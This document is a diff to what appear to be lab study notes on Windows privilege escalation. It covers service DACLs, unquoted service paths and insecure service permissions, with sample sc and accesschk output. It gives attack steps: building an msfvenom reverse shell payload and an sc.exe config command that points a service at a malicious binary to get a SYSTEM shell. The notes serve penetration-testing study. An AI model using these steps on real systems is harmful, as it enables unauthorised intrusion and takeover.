@@ -138,7 +138,7 @@ Set up a reverse shell handler and run msiexec to execute the payload
 
 **Windows Services**
 
-Windows services are managed by a process called the Service Control Manager (SCM). The SCM 
+Windows services are managed by a process called the *Service Control Manager* (SCM). The SCM 
 is in charge of managing the state of services as needed, checking the current status of 
 any given service and generally providing a way to configure services.
 
@@ -149,7 +149,7 @@ specifies the user account under which the it will run.
 
 Check service configurations with `sc qc`
 
-Services have a Discretionary Access Control List (DACL) indicating who has permission to
+Services have a *Discretionary Access Control List* (DACL) indicating who has permission to
 start, stop, pause, query status, query configuration, or reconfigure the service, amongst 
 other privileges. The DACL can be seen from Process Hacker under the Security tab of a 
 service.
@@ -179,3 +179,65 @@ permissions.
 `sc start <SERVICE-NAME>`
 
 **Unquoted Service Paths**
+
+Example service Disk Sorter Enterprise
+
+```
+C:\> sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+
+When the SCM tries to execute the associated binary, a problem arises. Since there are 
+spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, 
+and the SCM doesn't know which of the following you are trying to execute
+
+
+| Command Argument 1 | Argument 2 |
+|--------------------|------------|
+| C:\MyPrograms\Disk.exe | Sorter Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |
+
+### Insecure Service Permissions
+
+Check a service's DACL with [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. If misconfigured then a user 
+group may be able to to modify the configuration of the service and point to any executable
+and run it with any account including SYSTEM.
+
+```
+accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS                    <--- All Users have full access
+```
+
+Generate a reverse shell payload with msfvenom, upload it to the target and grant 
+permissions to Everyone with icacls
+
+Change the service's executable and account with sc.exe
+
+`sc.exe config <SERVICE-NAME> binpath= "/path/to/malicious/exe" obj= LocalSystem`
+
+Restart the service for a SYSTEM level reverse shell.
+
+### Abusing Dangerous Privileges
